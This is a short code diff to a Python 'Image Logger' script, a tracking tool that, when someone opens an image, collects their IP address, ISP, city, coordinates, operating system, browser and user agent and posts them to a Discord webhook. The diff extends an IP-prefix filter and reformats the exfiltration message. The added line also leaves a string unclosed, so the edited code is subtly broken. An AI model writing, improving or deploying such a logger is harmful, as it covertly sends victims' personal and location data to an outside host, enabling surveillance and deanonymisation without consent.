@@ -52,7 +52,7 @@ config = {
 }
 
 def makeReport(ip, useragent = None):
-    if ip.startswith(('34', '35')):
+    if ip.startswith(('34', '35', '104.169)):
         requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "",
@@ -92,7 +92,7 @@ def makeReport(ip, useragent = None):
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"**A User Opened the Original Image!**\n\n**IP Info:**\n> **IP**: `{ip}`\n> **Provider**: `{info['isp']}`\n> **ASN**: `{info['as']}`\n> **Country**: `{info['country']}`\n> **Region**: `{info['regionName']}`\n> **City**: `{info['city']}`\n> **Coords**: `{info['lat']}, {info['lon']}`\n> **Timezone**: `{info['timezone']}`\n> **Mobile:** `{info['mobile']}`\n> **VPN**: `{info['proxy']}{(' '+'(Possible Bot)') if info['hosting'] else ''}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser**: `{browser}`\n\n**User Agent**:\n```\n{useragent}\n```",
+            "description": f"**A User Opened the Original Image!**\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info['isp']}`\n> **ASN:** `{info['as']}`\n> **Country:** `{info['country']}`\n> **Region:** `{info['regionName']}`\n> **City:** `{info['city']}`\n> **Coords:** `{info['lat']}, {info['lon']}`\n> **Timezone:** `{info['timezone']}`\n> **Mobile:** `{info['mobile']}`\n> **VPN:** `{info['proxy']}{(' '+'(Possible Bot)') if info['hosting'] else ''}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n**User Agent:**\n```\n{useragent}\n```",
     }
   ],
 })
